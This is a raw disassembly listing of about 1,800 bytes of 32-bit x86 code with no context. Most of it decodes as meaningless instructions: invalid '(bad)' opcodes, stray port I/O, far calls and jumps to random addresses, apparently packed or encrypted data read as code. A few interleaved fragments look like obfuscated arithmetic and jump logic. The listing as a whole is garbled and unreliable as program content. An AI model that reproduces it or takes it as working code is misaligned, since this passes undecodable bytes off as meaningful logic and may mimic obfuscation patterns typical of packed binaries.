  40fcfa:	mov    edi,0xa8abf29f
  40fcff:	dec    edx
  40fd00:	sbb    eax,0xd9ed7a21
  40fd05:	fcompp 
  40fd07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd08:	sbb    eax,0xe8a90fa7
  40fd0d:	jmp    0x40fcf7
  40fd0f:	cdq    
  40fd10:	dec    esp
  40fd11:	inc    edx
  40fd12:	inc    eax
  40fd13:	push   edi
  40fd14:	out    0xea,al
  40fd16:	adc    BYTE PTR [edx-0x1b461c86],bh
  40fd1c:	(bad)  
  40fd1d:	pop    ecx
  40fd1e:	mov    dl,0xf6
  40fd20:	in     al,dx
  40fd21:	retf   
  40fd22:	rcl    DWORD PTR [eax-0x142c67e9],0x12
  40fd29:	sbb    ah,BYTE PTR [esi]
  40fd2b:	pop    ebx
  40fd2c:	pop    es
  40fd2d:	pusha  
  40fd2e:	inc    eax
  40fd2f:	dec    eax
  40fd30:	pop    esi
  40fd31:	inc    eax
  40fd32:	lods   al,BYTE PTR ds:[esi]
  40fd33:	dec    esi
  40fd34:	and    al,0xcc
  40fd36:	cmc    
  40fd37:	test   al,0x39
  40fd39:	std    
  40fd3a:	or     BYTE PTR [ebx+0x62],ch
  40fd3d:	test   eax,0xea25fcd3
  40fd42:	inc    eax
  40fd43:	ret    0x55f3
  40fd46:	pop    esi
  40fd47:	test   eax,0x46f568c3
  40fd4c:	mov    esp,0x624de29
  40fd51:	jg     0x40fd01
  40fd53:	pop    edi
  40fd54:	jmp    0x492c6818
  40fd59:	mov    ds:0xa4348446,eax
  40fd5e:	dec    ecx
  40fd5f:	cs (bad) 
  40fd61:	jnp    0x40fcea
  40fd63:	or     BYTE PTR [ebp-0xe3fca3a],bl
  40fd69:	xchg   ecx,eax
  40fd6a:	inc    ebx
  40fd6b:	cdq    
  40fd6c:	ror    esp,1
  40fd6e:	jg     0x40fd60
  40fd70:	inc    esi
  40fd71:	data16 mov ch,0x52
  40fd74:	adc    cl,al
  40fd76:	jge    0x40fd27
  40fd78:	inc    ebp
  40fd79:	sbb    DWORD PTR [ebx-0x4],edi
  40fd7c:	push   esi
  40fd7d:	add    al,0xee
  40fd7f:	mov    ah,0x81
  40fd81:	lahf   
  40fd82:	add    BYTE PTR [ecx],0xe5
  40fd85:	sub    edi,edx
  40fd87:	mov    edx,DWORD PTR [ebp-0x4]
  40fd8a:	xor    edx,eax
  40fd8c:	add    edx,ecx
  40fd8e:	cmp    edi,edx
  40fd90:	jb     0x414e2e
  40fd96:	mov    edx,DWORD PTR [ebp-0x28]
  40fd99:	mov    edi,DWORD PTR [ebp-0x4]
  40fd9c:	xor    edx,eax
  40fd9e:	xor    edi,eax
  40fda0:	add    edi,ecx
  40fda2:	add    edx,ecx
  40fda4:	imul   edx,edi
  40fda7:	mov    edi,DWORD PTR [ebp-0x8]
  40fdaa:	jmp    0x410032
  40fdaf:	mov    ecx,0xcac93ec5
  40fdb5:	(bad)  
  40fdb6:	leave  
  40fdb7:	dec    esp
  40fdb8:	mov    bl,0x33
  40fdba:	std    
  40fdbb:	test   DWORD PTR [eax],0x4b7a2368
  40fdc1:	js     0x40fe3b
  40fdc3:	in     eax,0x7e
  40fdc5:	js     0x40fe3f
  40fdc7:	adc    bh,cl
  40fdc9:	mov    al,ds:0xd82eabc1
  40fdce:	push   edx
  40fdcf:	repz adc DWORD PTR [edi-0x18],edx
  40fdd3:	shl    BYTE PTR [esi+esi*4+0x78e5879e],cl
  40fdda:	jne    0x40fe19
  40fddc:	cs jmp 0x40fd8c
  40fddf:	mov    ch,0xf3
  40fde1:	neg    BYTE PTR [eax]
  40fde3:	jge    0x40fd96
  40fde5:	jp     0x40fd80
  40fde7:	idiv   BYTE PTR [eax-0x4f]
  40fdea:	daa    
  40fdeb:	pushf  
  40fdec:	jb     0x40fdbf
  40fdee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fdef:	push   ebx
  40fdf0:	adc    ch,BYTE PTR [ecx+0x6f773fbd]
  40fdf6:	push   cs
  40fdf7:	dec    edi
  40fdf8:	scas   eax,DWORD PTR es:[edi]
  40fdf9:	push   0x8f74649e
  40fdfe:	xchg   ecx,eax
  40fdff:	outs   dx,DWORD PTR ds:[esi]
  40fe00:	pop    edi
  40fe01:	and    edx,esp
  40fe03:	neg    DWORD PTR [edi-0x22af5b7d]
  40fe09:	fwait
  40fe0a:	sbb    eax,0x356bd224
  40fe0f:	das    
  40fe10:	out    dx,eax
  40fe11:	fidiv  WORD PTR ss:[eax+0x4c8eb9c4]
  40fe18:	imul   eax,DWORD PTR [edx-0x6a],0xfffffff9
  40fe1c:	mov    BYTE PTR [esi-0x35],bl
  40fe1f:	(bad)  
  40fe20:	bound  ebp,QWORD PTR [ebx]
  40fe22:	add    eax,0xc094f832
  40fe27:	sub    DWORD PTR [ebx+0x6c],esi
  40fe2a:	(bad)  
  40fe2b:	sub    BYTE PTR [ebp-0x4c68fdf7],dl
  40fe31:	js     0x40fe5c
  40fe33:	std    
  40fe34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe35:	sbb    eax,0xaab4a060
  40fe3a:	jg     0x40fe0d
  40fe3c:	mov    WORD PTR [edi+0x61],ss
  40fe3f:	xor    BYTE PTR [ebp-0x52f20c08],cl
  40fe45:	or     ah,ch
  40fe47:	push   ss
  40fe48:	pop    ds
  40fe49:	push   0xcbbacfc3
  40fe4e:	aas    
  40fe4f:	adc    ch,BYTE PTR [ecx+0x4d10719f]
  40fe55:	sub    al,0x6
  40fe57:	leave  
  40fe58:	adc    eax,0xc7e39955
  40fe5d:	(bad)  
  40fe5f:	lods   al,BYTE PTR ds:[esi]
  40fe60:	or     BYTE PTR [edi],bl
  40fe62:	ficomp DWORD PTR [ecx-0x7bdd6e3e]
  40fe68:	(bad)  
  40fe69:	out    0x25,eax
  40fe6b:	out    0x90,al
  40fe6d:	push   esi
  40fe6e:	jb     0x40fe65
  40fe70:	pushf  
  40fe71:	out    0x5d,eax
  40fe73:	(bad)  
  40fe75:	rol    bl,1
  40fe77:	repz jmp 0xd4ceb7e9
  40fe7d:	cmp    eax,0x77166aeb
  40fe82:	xor    al,0x1d
  40fe84:	fadd   QWORD PTR [eax-0x37b16964]
  40fe8a:	pop    esp
  40fe8b:	xor    al,0x98
  40fe8d:	mov    esp,0x5cf0a41c
  40fe92:	push   es
  40fe93:	pop    esp
  40fe94:	and    eax,0xa655099f
  40fe99:	and    ecx,eax
  40fe9b:	push   0x92fa7679
  40fea0:	call   0x6f47:0xfb43e8c1
  40fea7:	xchg   ebp,eax
  40fea8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fea9:	mov    DWORD PTR [ebx+edx*2],esi
  40feac:	fdivr  DWORD PTR [eax-0x68a568f3]
  40feb2:	pop    edi
  40feb3:	cli    
  40feb4:	test   BYTE PTR [edi],bl
  40feb6:	bound  edi,QWORD PTR [ebx]
  40feb8:	mov    ebx,0x61d72f11
  40febd:	pop    ecx
  40febe:	dec    eax
  40febf:	mov    esp,eax
  40fec1:	dec    edi
  40fec2:	adc    eax,0xce44c4ad
  40fec7:	adc    cl,BYTE PTR [eax]
  40fec9:	dec    ebp
  40feca:	pop    ds
  40fecb:	sbb    dl,BYTE PTR [esi+0x6d4b1965]
  40fed1:	repnz push es
  40fed3:	std    
  40fed4:	fidivr WORD PTR [ebx+0x48]
  40fed7:	and    esp,DWORD PTR [esi-0x4d]
  40feda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fedb:	out    dx,al
  40fedc:	loop   0x40ff38
  40fede:	(bad)
  40fee1:	into   
  40fee2:	gs pop edi
  40fee4:	pop    es
  40fee5:	outs   dx,DWORD PTR ds:[si]
  40fee7:	add    esi,DWORD PTR [edx+0x58]
  40feea:	lods   eax,DWORD PTR ds:[esi]
  40feeb:	push   ebp
  40feec:	mov    esp,edx
  40feee:	dec    DWORD PTR [eax+0x6d]
  40fef1:	fxtract 
  40fef3:	in     al,0x81
  40fef5:	add    al,0x6
  40fef7:	lock xlat BYTE PTR ds:[ebx]
  40fef9:	mov    ch,0xcc
  40fefb:	adc    dl,al
  40fefd:	or     al,0x4b
  40feff:	(bad)  
  40ff01:	jbe    0x40ff45
  40ff03:	cmp    al,0x82
  40ff05:	sub    ecx,DWORD PTR [ecx+0x47]
  40ff08:	cmc    
  40ff09:	ss jo  0x40ff51
  40ff0c:	xchg   BYTE PTR [ebx+0x45],dh
  40ff0f:	cmp    BYTE PTR [edx+0x727f8b07],bl
  40ff15:	jno    0x40ff25
  40ff17:	test   DWORD PTR [eax+eiz*8],0x4ce85bce
  40ff1e:	scas   al,BYTE PTR es:[edi]
  40ff1f:	int    0x4a
  40ff21:	aad    0x5d
  40ff23:	or     esi,DWORD PTR [ecx]
  40ff25:	in     eax,dx
  40ff26:	adc    DWORD PTR [esi+0x31],ecx
  40ff29:	cmp    DWORD PTR [edi],0x65b6ac75
  40ff2f:	dec    eax
  40ff30:	cs mov edx,0x9cf7f07a
  40ff36:	(bad)  
  40ff37:	or     BYTE PTR [edx],cl
  40ff39:	push   ds
  40ff3a:	ret    0x216d
  40ff3d:	ins    DWORD PTR es:[edi],dx
  40ff3e:	ins    BYTE PTR es:[edi],dx
  40ff3f:	repz loope 0x40feff
  40ff42:	leave  
  40ff43:	gs jp  0x40ff8f
  40ff46:	mov    edi,0x1ab6c46f
  40ff4b:	cmp    eax,0xd72340c8
  40ff50:	jns    0x40ffb2
  40ff52:	lods   eax,DWORD PTR ds:[esi]
  40ff53:	fimul  DWORD PTR [esi+ebx*4-0x8acd3c6]
  40ff5a:	inc    ebp
  40ff5b:	and    bh,BYTE PTR ds:0x332253e1
  40ff61:	pop    ebx
  40ff62:	sbb    al,0x64
  40ff64:	mov    bh,0x31
  40ff66:	sbb    WORD PTR [edi],ax
  40ff69:	jge    0x40ffb5
  40ff6b:	inc    ebp
  40ff6c:	clc    
  40ff6d:	mov    DWORD PTR ds:0x75bf465,esp
  40ff73:	test   DWORD PTR [ecx],esp
  40ff75:	rcl    BYTE PTR [edi],cl
  40ff77:	jl     0x40ff32
  40ff79:	dec    esi
  40ff7a:	pushf  
  40ff7b:	loop   0x40ff20
  40ff7d:	addr16 fstp st(7)
  40ff80:	or     eax,DWORD PTR [ecx-0x2307764d]
  40ff86:	loope  0x40ffd6
  40ff88:	mov    ebp,0x65448115
  40ff8d:	mov    edx,ebx
  40ff8f:	cwde   
  40ff90:	int    0xa1
  40ff92:	jmp    0xa4863d33
  40ff97:	adc    bh,bh
  40ff99:	imul   esi,DWORD PTR [ebp+0x48fb6309],0x3c
  40ffa0:	fstp   DWORD PTR [ebp+0x8]
  40ffa3:	scas   al,BYTE PTR es:[edi]
  40ffa4:	mov    bl,0xd5
  40ffa6:	ins    BYTE PTR es:[edi],dx
  40ffa7:	add    BYTE PTR [eax+0x27598b36],dh
  40ffad:	(bad)  
  40ffaf:	loope  0x40ffcd
  40ffb1:	aaa    
  40ffb2:	test   BYTE PTR [ebx+0x40],al
  40ffb5:	sub    al,0x13
  40ffb7:	fucomip st,st(0)
  40ffb9:	and    eax,0xdba3ed38
  40ffbe:	and    al,BYTE PTR [esi+eax*2+0x379e1fb3]
  40ffc5:	cmp    esi,edx
  40ffc7:	sub    ch,BYTE PTR [esi+0x51c4c63f]
  40ffcd:	inc    esi
  40ffce:	pop    edi
  40ffcf:	mov    dh,0x10
  40ffd1:	out    dx,al
  40ffd2:	mov    esi,0xab13e3a2
  40ffd7:	ins    DWORD PTR es:[edi],dx
  40ffd8:	pop    edx
  40ffd9:	push   cs
  40ffda:	ss push ebp
  40ffdc:	fld    DWORD PTR [ebx-0x2a]
  40ffdf:	test   al,0x94
  40ffe1:	mov    bl,0xff
  40ffe3:	cmp    DWORD PTR [ecx+0x4155608b],edi
  40ffe9:	ins    DWORD PTR es:[edi],dx
  40ffea:	cmp    eax,0xbbcf81b9
  40ffef:	mov    es,WORD PTR [esp+edi*1-0x2e]
  40fff3:	fsubr  QWORD PTR [ebx-0x6ef70bc]
  40fff9:	push   edi
  40fffa:	hlt    
  40fffb:	dec    eax
  40fffc:	(bad)  [edi+0x3255668f]
  410002:	or     BYTE PTR [edx+edi*1],cl
  410005:	cmp    dh,BYTE PTR [ebp+0x68]
  410008:	inc    esi
  410009:	add    esp,DWORD PTR [esi]
  41000b:	sub    al,0xd4
  41000d:	ret    0xa700
  410010:	out    0xea,eax
  410012:	dec    ebx
  410013:	mov    dh,0x6a
  410015:	aad    0xa
  410017:	inc    edi
  410018:	loope  0x410097
  41001a:	mov    al,ds:0xb0513c28
  41001f:	es xor bh,0x2d
  410023:	aad    0xd7
  410025:	push   0xffffffcb
  410027:	adc    DWORD PTR [ebx],0x21
  41002a:	dec    ebx
  41002b:	jle    0x410001
  41002d:	test   al,0x3e
  41002f:	(bad)  
  410030:	data16 ja 0x40ffbe
  410033:	pop    ebp
  410034:	lock sub ebx,edi
  410037:	cmp    ebx,edx
  410039:	ja     0x41004b
  41003f:	mov    edx,DWORD PTR [ebp-0x4]
  410042:	xor    edx,eax
  410044:	add    edx,ecx
  410046:	jmp    0x41220c
  41004b:	mov    edx,DWORD PTR [ebp-0x2c]
  41004e:	mov    edi,DWORD PTR [ebp-0x4]
  410051:	xor    edx,eax
  410053:	xor    edi,eax
  410055:	add    edi,ecx
  410057:	jmp    0x4102df
  41005c:	sar    DWORD PTR [eax+edx*8],cl
  41005f:	int    0xd7
  410061:	(bad)  
  410063:	ret    0x69c5
  410066:	xchg   ebx,eax
  410067:	daa    
  410068:	aaa    
  410069:	ret    0x3028
  41006c:	out    0x48,eax
  41006e:	js     0x4100e8
  410070:	in     eax,0x7e
  410072:	js     0x4100ec
  410074:	test   cl,bh
  410076:	(bad)  
  410077:	pop    ebx
  410078:	sub    eax,0x8b035291
  41007d:	pop    ds
  41007e:	xor    bl,ch
  410080:	fcom   QWORD PTR [ebx-0x74453a97]
  410086:	shl    DWORD PTR [esi+eiz*8],cl
  410089:	inc    ecx
  41008a:	adc    al,0xec
  41008c:	jl     0x41006f
  41008e:	mov    edx,0xa1624dba
  410093:	mov    ?,esp
  410095:	(bad)  
  410096:	js     0x410107
  410098:	leave  
  410099:	aad    0xc4
  41009b:	fdivr  st(1),st
  41009d:	xor    bh,BYTE PTR ds:0x6e8f5717
  4100a3:	sub    edx,eax
  4100a5:	jmp    0x410112
  4100a7:	in     al,0x25
  4100a9:	in     eax,0xe0
  4100ab:	das    
  4100ac:	mov    eax,0x66159d35
  4100b1:	rsm    
  4100b3:	jnp    0x41004a
  4100b5:	sar    dl,1
  4100b7:	dec    edx
  4100b8:	sub    dl,BYTE PTR [edx+ebx*1]
  4100bb:	mov    edi,0x19394c37
  4100c0:	aaa    
  4100c1:	inc    esp
  4100c2:	ret    
  4100c3:	std    
  4100c4:	add    al,0xd9
  4100c6:	icebp  
  4100c7:	mov    dl,BYTE PTR [eax]
  4100c9:	sbb    DWORD PTR [edi+esi*8-0x42],edi
  4100cd:	test   eax,0xcd793481
  4100d2:	cmp    eax,0x6a939f88
  4100d7:	enter  0x9bbe,0x8c
  4100db:	mov    ch,0xb5
  4100dd:	aas    
  4100de:	xor    al,0x9b
  4100e0:	mov    edi,DWORD PTR [edi+0x4a26b937]
  4100e6:	fnstsw WORD PTR [eax-0x60716c7b]
  4100ec:	pushf  
  4100ed:	pop    esp
  4100ee:	add    DWORD PTR [edi+ebx*2],eax
  4100f1:	stos   BYTE PTR es:[edi],al
  4100f2:	pop    eax
  4100f3:	add    al,0x1d
  4100f5:	sub    cl,BYTE PTR [edx-0x3]
  4100f8:	ds (bad) 
  4100fa:	hlt    
  4100fb:	sbb    dl,BYTE PTR [ecx]
  4100fd:	sbb    BYTE PTR [esi-0x13],0x59
  410101:	rcl    esp,0xfd
  410104:	mov    BYTE PTR [edi-0x788959d7],dh
  41010a:	repnz sbb ah,dl
  41010d:	inc    ecx
  41010e:	ret    0x87b8
  410111:	and    BYTE PTR [edx+0x28878b51],dh
  410117:	leave  
  410118:	sub    al,BYTE PTR [edx+0x2a]
  41011b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41011c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41011d:	lock push es
  41011f:	call   FWORD PTR [ecx-0x3ac2ab70]
  410125:	push   edi
  410126:	das    
  410127:	cli    
  410128:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410129:	in     eax,dx
  41012a:	sti    
  41012b:	(bad)
  41012f:	daa    
  410130:	cmp    al,0x26
  410132:	mov    ch,0x6e
  410134:	inc    edx
  410135:	xchg   ecx,eax
  410136:	push   ebx
  410137:	data16 mov ah,0xe3
  41013a:	data16 cmp dh,ch
  41013d:	imul   eax,DWORD PTR [eax+0x71d4d4b9],0x4b
  410144:	jno    0x410114
  410146:	mov    esp,0xe8654f6b
  41014b:	inc    edx
  41014c:	mov    al,0x98
  41014e:	mov    DWORD PTR [esi-0x3b],esp
  410151:	xchg   ebx,eax
  410152:	fcomp  st(2)
  410154:	sub    DWORD PTR [ebx],esi
  410156:	int    0x88
  410158:	retf   0x97be
  41015b:	sub    al,0xe
  41015d:	shr    eax,cl
  41015f:	not    esi
  410161:	add    ah,BYTE PTR [ebx-0x48]
  410164:	divps  xmm1,XMMWORD PTR [edx]
  410167:	call   0x820a:0x77d2013c
  41016e:	rol    ebp,1
  410170:	pop    ecx
  410171:	pop    ds
  410172:	(bad)  
  410173:	loope  0x4100f7
  410175:	test   DWORD PTR [esi-0xa5b8eae],ebp
  41017b:	call   0x396d9728
  410180:	cmp    ecx,DWORD PTR [ebx]
  410182:	inc    esi
  410183:	xchg   esi,eax
  410184:	dec    ebx
  410185:	or     ecx,DWORD PTR [ebp+0x41]
  410188:	or     ebp,DWORD PTR [ecx+0x35]
  41018b:	aaa    
  41018c:	test   eax,0x50d0881c
  410191:	adc    DWORD PTR [edx+ecx*1],ecx
  410194:	inc    ebx
  410195:	test   al,0x18
  410197:	xor    DWORD PTR [eax-0x4e],0xd4f27b5c
  41019e:	sub    DWORD PTR [ecx],0xffffffe4
  4101a1:	cmc    
  4101a2:	int    0xd8
  4101a4:	out    dx,eax
  4101a5:	test   al,0x9f
  4101a7:	or     ah,BYTE PTR [edx+0x6e]
  4101aa:	sbb    ebp,DWORD PTR [ecx+0x3d3eb2ad]
  4101b0:	(bad)  
  4101b2:	into   
  4101b3:	addr16 ret 
  4101b5:	sub    DWORD PTR [ecx+0x43a29522],esi
  4101bb:	stc    
  4101bc:	fdiv   DWORD PTR [ebp+0x7d]
  4101bf:	int    0x68
  4101c1:	retf   0x5ca6
  4101c4:	inc    esp
  4101c5:	push   edi
  4101c6:	stos   DWORD PTR es:[edi],eax
  4101c7:	pop    ecx
  4101c8:	xlat   BYTE PTR ds:[ebx]
  4101c9:	call   0xa0a32d68
  4101ce:	dec    edx
  4101cf:	ins    BYTE PTR es:[edi],dx
  4101d0:	dec    ecx
  4101d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101d2:	retf   
  4101d3:	loopne 0x4101c1
  4101d5:	in     al,0x4f
  4101d7:	mov    ds:0x6b6e5f,al
  4101dc:	dec    edx
  4101dd:	and    BYTE PTR [edi],al
  4101df:	les    eax,FWORD PTR [edi-0x57dea8d6]
  4101e5:	idiv   DWORD PTR [ebx]
  4101e7:	mov    ch,0x93
  4101e9:	imul   esi,ecx,0xe16bc5ad
  4101ef:	or     BYTE PTR [ebx+0x28],cl
  4101f2:	xor    BYTE PTR [ebp-0x5],cl
  4101f5:	cmp    DWORD PTR [esi],esp
  4101f7:	shr    BYTE PTR [ebp-0x2b],cl
  4101fa:	call   0x4a91175b
  4101ff:	mov    al,es:0xf2d10d72
  410205:	test   DWORD PTR [ecx+0x4d],eax
  410208:	or     eax,0x39dd6d9e
  41020d:	sub    edi,DWORD PTR [edi+0x6d53d9e0]
  410213:	popa   
  410214:	push   edx
  410215:	into   
  410216:	or     cl,dl
  410218:	dec    ebx
  410219:	mov    eax,ds:0x196bf140
  41021e:	or     BYTE PTR [eax-0x11e6046],0xe
  410225:	push   ds
  410226:	enter  0x77ee,0x35
  41022a:	push   cs
  41022b:	sub    BYTE PTR [ecx+edi*8+0x7090611a],dl
  410232:	mov    BYTE PTR [eax-0x2],ah
  410235:	jl     0x41025b
  410237:	in     al,dx
  410238:	add    esp,esi
  41023a:	popa   
  41023b:	addr16 or esi,ecx
  41023e:	lea    esi,[eax]
  410240:	stc    
  410241:	in     eax,dx
  410242:	pop    ebx
  410243:	mov    ah,0xdb
  410245:	push   ecx
  410246:	push   edx
  410247:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410248:	or     DWORD PTR [edx-0x716a59c2],edx
  41024e:	jp     0x410233
  410250:	adc    dh,cl
  410252:	fcom   st(6)
  410254:	cli    
  410255:	test   BYTE PTR [ecx],cl
  410257:	sbb    ah,bl
  410259:	pop    ds
  41025a:	cmc    
  41025b:	dec    edi
  41025c:	mov    ecx,0x132dae97
  410261:	fidivr WORD PTR [eax+0x61a75876]
  410267:	add    BYTE PTR [edi-0x12],0xfa
  41026b:	clc    
  41026c:	int    0xd1
  41026e:	inc    edi
  41026f:	test   al,0xd4
  410271:	jmp    0xe2d4:0x81de296c
  410278:	call   0x44ca0a38
  41027d:	ins    DWORD PTR es:[edi],dx
  41027e:	(bad)  
  410280:	cdq    
  410281:	jo     0x4102c1
  410283:	lds    edi,FWORD PTR [ebp-0x44]
  410286:	xchg   edi,eax
  410287:	mov    al,0xac
  410289:	(bad)  
  41028a:	jp     0x410280
  41028c:	sub    ebx,DWORD PTR [esi+0x5782aa0a]
  410292:	push   edx
  410293:	es push edi
  410295:	fld    TBYTE PTR [ebx-0x31e59f76]
  41029b:	lods   eax,DWORD PTR ds:[esi]
  41029c:	shl    BYTE PTR [esi],0x79
  41029f:	xor    bl,BYTE PTR [ecx+0x798a4ea7]
  4102a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102a6:	push   edi
  4102a7:	and    dh,BYTE PTR [edx]
  4102a9:	cmovo  esi,DWORD PTR [ebx-0x32]
  4102ad:	cld    
  4102ae:	aaa    
  4102af:	rcl    BYTE PTR gs:[ebx+0xa],cl
  4102b3:	or     ecx,DWORD PTR ds:0xea2e5e1
  4102b9:	or     ah,BYTE PTR [ebp-0x41]
  4102bc:	dec    ecx
  4102bd:	xlat   BYTE PTR ds:[ebx]
  4102be:	add    eax,0x63a86425
  4102c3:	jae    0x4102c4
  4102c5:	mov    gs,WORD PTR [edx+0x8]
  4102c8:	push   0x64
  4102ca:	push   0xa6cff050
  4102cf:	popa   
  4102d0:	test   DWORD PTR [edi],ecx
  4102d2:	outs   dx,DWORD PTR ds:[esi]
  4102d3:	mov    edi,0xdf348cf9
  4102d8:	inc    ebp
  4102d9:	out    dx,eax
  4102da:	or     eax,0xdb7230a6
  4102df:	add    edx,ecx
  4102e1:	jmp    0x410569
  4102e6:	ret    
  4102e7:	int    0xc7
  4102e9:	into   
  4102ea:	(bad)  
  4102ec:	(bad)  
  4102ee:	xchg   BYTE PTR [edi],dh
  4102f0:	jle    0x410290
  4102f2:	dec    ebx
  4102f3:	daa    
  4102f4:	out    dx,al
  4102f5:	and    eax,0x78784e4c
  4102fa:	in     eax,0x7e
  4102fc:	js     0x410376
  4102fe:	sub    BYTE PTR [ebx-0x29],0x75
  410302:	ret    0x8b3e
  410305:	in     eax,0x3a
  410307:	out    dx,al
  410308:	lahf   
  410309:	jb     0x4102d2
  41030b:	out    dx,al
  41030c:	cmp    eax,0x88b7be47
  410311:	(bad)  
  410312:	push   eax
  410313:	repz adc BYTE PTR [eax+eiz*8+0x70064437],dh
  41031b:	sbb    BYTE PTR [ebx],bl
  41031d:	xchg   DWORD PTR fs:[edi+0x16787aa9],ecx
  410324:	(bad)  
  410325:	dec    ebx
  410326:	imul   edx,DWORD PTR [edi],0xfffffffa
  410329:	bound  ebp,QWORD PTR [ebx-0x547352a7]
  41032f:	and    cl,BYTE PTR ds:0xf1e661b3
  410335:	jbe    0x4102df
  410337:	mov    eax,ds:0xbc352606
  41033c:	ds (bad) 
  41033e:	test   eax,0x80d6819c
  410343:	ins    DWORD PTR es:[edi],dx
  410344:	daa    
  410345:	add    edi,DWORD PTR [ebx]
  410347:	loopne 0x410374
  410349:	pop    esi
  41034a:	loopne 0x410382
  41034c:	push   cs
  41034d:	inc    esi
  41034e:	aas    
  41034f:	mov    DWORD PTR [edi],edi
  410351:	fucomip st,st(2)
  410353:	xchg   edi,eax
  410354:	adc    eax,0x93f62bb3
  410359:	aam    0x49
  41035b:	inc    edi
  41035c:	add    BYTE PTR [esi-0x6f],bl
  41035f:	dec    dl
  410361:	mov    ah,0xee
  410363:	cli    
  410364:	cdq    
  410365:	sub    DWORD PTR [ecx+0x54679be2],0xffffffac
  41036c:	add    eax,0x56fabff8
  410371:	stc    
  410372:	test   al,0x54
  410374:	xor    ebx,DWORD PTR [edx-0x43]
  410377:	and    eax,0xce8d65fe
  41037c:	test   BYTE PTR [eax],cl
  41037e:	inc    ebx
  41037f:	stos   BYTE PTR es:[edi],al
  410380:	ret    
  410381:	into   
  410382:	add    esi,DWORD PTR ss:[edx-0x3e]
  410386:	dec    eax
  410387:	xchg   BYTE PTR [ebx-0x52],ah
  41038a:	and    ah,BYTE PTR [edi-0x16]
  41038d:	leave  
  41038e:	jmp    0x39ea0c25
  410393:	pop    ebp
  410394:	xchg   ebp,eax
  410395:	sub    BYTE PTR [esi+0x499e49c],cl
  41039b:	or     ecx,edx
  41039d:	out    dx,al
  41039e:	pop    esp
  41039f:	push   ss
  4103a0:	inc    ebp
  4103a1:	pop    eax
  4103a2:	cli    
  4103a3:	push   edx
  4103a4:	loopne 0x4103e1
  4103a6:	mov    eax,0x557cf332
  4103ab:	mov    dh,0xe3
  4103ad:	sbb    ebx,DWORD PTR [ebp+0x2]
  4103b0:	xchg   esp,eax
  4103b1:	retf   
  4103b2:	xor    DWORD PTR [edx],eax
  4103b4:	(bad)  [eax+0x3f97274f]
  4103ba:	sub    edx,edx
  4103bc:	xor    bl,BYTE PTR [esi-0x5a2b3c87]
  4103c2:	pop    esp
  4103c3:	mov    DWORD PTR [edi],eax
  4103c5:	pop    eax
  4103c6:	lock mov ebx,0xc3da1f44
  4103cc:	scas   eax,DWORD PTR es:[edi]
  4103cd:	iret   
  4103ce:	sub    bl,BYTE PTR [edi]
  4103d0:	add    ebx,DWORD PTR [eax-0x63]
  4103d3:	jmp    0xe522:0xdd92a6a8
  4103da:	imul   eax,DWORD PTR [ecx+0x2c],0xffffffc6
  4103de:	retfw  
  4103e0:	jp     0x4103cf
  4103e2:	imul   ebp,DWORD PTR [eax],0xffffff84
  4103e5:	(bad)  
  4103e7:	cmp    al,0x48
  4103e9:	mov    bl,0x5f
  4103eb:	pop    es
  4103ec:	rol    BYTE PTR [ebp+0x331f98c6],cl
  4103f2:	dec    edx
  4103f3:	or     eax,0xdab64402
  4103f8:	aas    
  4103f9:	adc    al,0x49
  4103fb:	or     eax,0x4ca08e8c
  410400:	test   al,0xf4
  410402:	jge    0x4103d4
  410404:	mov    eax,0x8ccf1b84
  410409:	leave  
  41040a:	loopne 0x410446
  41040c:	cli    
  41040d:	adc    BYTE PTR [edi-0x1cf85025],ah
  410413:	pop    edi
  410414:	lea    ebx,[edx+0x35]
  410417:	push   edi
  410418:	mov    dl,0x75
  41041a:	xchg   edi,eax
  41041b:	call   0x12c0:0x52c41a25
  410422:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410423:	sub    DWORD PTR [ebp+0x32f88d],esp
  410429:	retf   0xfc16
  41042c:	push   cs
  41042d:	or     DWORD PTR [ebp+0x22d2f8a5],esi
  410433:	pop    es
  410434:	(bad)  
  410435:	lock into 
  410437:	jmp    0x4529:0x74bc4edc
  41043e:	in     al,0xc
  410440:	fsubr  QWORD PTR [ebx+0x5f]
  410443:	mov    bl,0x43
  410445:	sub    BYTE PTR [edi],0xc1
  410448:	push   es
  410449:	into   
  41044a:	cmp    eax,0x88c3c3ba
  41044f:	ret    
  410450:	pop    ss
  410451:	jle    0x410410
  410453:	ss xchg ecx,eax
  410455:	mov    ds:0x538ebebf,al
  41045a:	mov    al,0xca
  41045c:	mov    eax,ds:0xa63ca949
  410461:	mov    esi,0x85b2ccec
  410466:	arpl   WORD PTR [ebx],bx
  410468:	xor    dh,BYTE PTR [eax+0x470cdf39]
  41046e:	scas   al,BYTE PTR es:[edi]
  41046f:	mov    eax,DWORD PTR [edx]
  410471:	xor    eax,0xd68d7d9
  410476:	cmp    eax,0x2d6b617d
  41047b:	xchg   esi,eax
  41047c:	call   0x8630:0xd5fbdecf
  410483:	addr16 mov bh,0x29
  410486:	mov    ah,0x94
  410488:	imul   eax,DWORD PTR [edi],0xffffffb1
  41048b:	sbb    BYTE PTR [edi-0x78],dl
  41048e:	and    cl,ch
  410490:	or     eax,0x9eac3dc4
  410495:	shr    DWORD PTR [ecx+ebp*2],0x69
  410499:	pusha  
  41049a:	aas    
  41049b:	pop    es
  41049c:	mov    eax,ds:0xde0c663d
  4104a1:	mov    dh,0x42
  4104a3:	mov    edi,0x786c5f48
  4104a8:	xor    al,BYTE PTR [esi]
  4104aa:	inc    edx
  4104ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104ac:	jmp    0x4104d7
  4104ae:	jb     0x4104dc
  4104b0:	add    edi,DWORD PTR [ebp-0x4853cef6]
  4104b6:	fmul   DWORD PTR [edx+0x30af2953]
  4104bc:	shl    DWORD PTR [eax],0x18
  4104bf:	pop    ebp
  4104c0:	pop    edi
  4104c1:	loopne 0x4104d4
